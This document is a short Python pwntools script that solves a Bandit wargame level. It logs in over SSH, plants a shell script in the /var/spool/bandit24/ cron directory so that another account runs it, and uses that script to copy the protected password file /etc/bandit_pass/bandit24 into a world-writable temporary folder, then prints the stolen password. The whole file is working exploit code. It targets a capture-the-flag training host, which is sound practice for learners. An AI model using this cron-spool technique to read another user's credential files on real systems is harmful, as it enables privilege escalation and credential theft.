from pwn import *
import os, tempfile, time
import config

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

conn = ssh(host=config.url, user=user, password=password, port=config.port)

temp_dir = tempfile.mkdtemp()

shell_script = """#!/bin/bash
cat /etc/bandit_pass/bandit24 > %s/passwd
""" % temp_dir

conn.mkdir(temp_dir)
conn.upload_data(shell_script, "%s/script.sh" % temp_dir)
conn.chmod("a+w", temp_dir)
conn.chmod("a+x", "%s/script.sh" % temp_dir)
conn.cp("%s/script.sh" % temp_dir, "/var/spool/bandit24/")

print("Wait until a minute...")
time.sleep(60)

flag = conn.cat(temp_dir + "/passwd")

print("Flag : " + flag)
